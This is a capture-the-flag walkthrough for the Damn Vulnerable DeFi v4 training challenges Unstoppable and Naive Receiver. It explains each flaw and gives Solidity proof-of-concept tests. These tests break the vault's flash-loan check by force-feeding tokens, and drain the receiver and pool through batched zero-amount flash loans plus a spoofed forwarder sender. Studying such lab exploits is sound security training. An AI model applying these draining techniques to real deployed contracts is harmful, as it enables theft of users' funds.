# Damn Vulnerable DeFi v4 Walkthorugh

## 1.UNSTOPPABLE
Starting with 10 DVT tokens in balance, show that it’s possible to halt the vault. It must stop offering flash loans. _See [challenges/unstoppable/](https://www.damnvulnerabledefi.xyz/challenges/unstoppable/)_

### Objective
_from `_isSolved()`in test_
1. _Flashloan check must fail_

### Attack Analysis

- The balance of `UnstoppableVault` is not accounted for unexpected changes (e.g. force feeding ERC20 tokens), by just transfering a small amount to the vault, the below condition fail and revert

### PoC

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1e18);
}
```
_See [test/unstoppable/Unstoppable.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/unstoppable/Unstoppable.t.sol)_

----
## 2.NAIVE RECEIVER

### Objective
_from `_isSolved()`in test_
1. _Player must have executed two or less transactions_
2. _The flashloan receiver contract has been emptied_
3. _Pool is empty too_
4. _All funds sent to recovery account_

### Attack Analysis
- The FlashLoanReceiver starts with 10 ETH and incurs a 1 ETH fee to the pool for each flash loan it takes. The vulnerability is that the `onFlashLoan` function doesn't verify the authorization of the flash loan's origin. By executing 10 flash loans with an amount of 0, we can deplete the FlashLoanReceiver's 10 ETH. However, the constraint is that the Nonce must be under 2. Since NaiveReceiverPool supports Multicall, we can leverage it to conduct all 10 flash loan operations in a single transaction, thereby meeting the Nonce requirement.
- The next step is to extract the initial 1000 ETH from the NaiveReceiverPool. The only way to transfer assets is through the `withdraw` function. For this function to execute, `_msgSender` must meet the conditions where `msg.sender` equals `trustedForwarder` and `msg.data.length` is at least 20 bytes, which leaves room for tampering.
- Lastly, using a forwarder to execute a meta-transaction, the `msg.sender == trustedForwarder` condition can be met.

### POC

```solidity
 function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDataArray = new bytes[](11);
        for (uint256 i = 0; i < 10; i++) {
            callDataArray[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
        }
        callDataArray[10] = abi.encodePacked(
            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );

        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, callDataArray);

        BasicForwarder.Request memory request =
            BasicForwarder.Request(player, address(pool), 0, gasleft(), forwarder.nonces(player), callData, 1 days);

        bytes32 requestHash =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }
```
See [test/naive-receiver/NaiveReceiver.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/naive-receiver/NaiveReceiver.t.sol)

---- 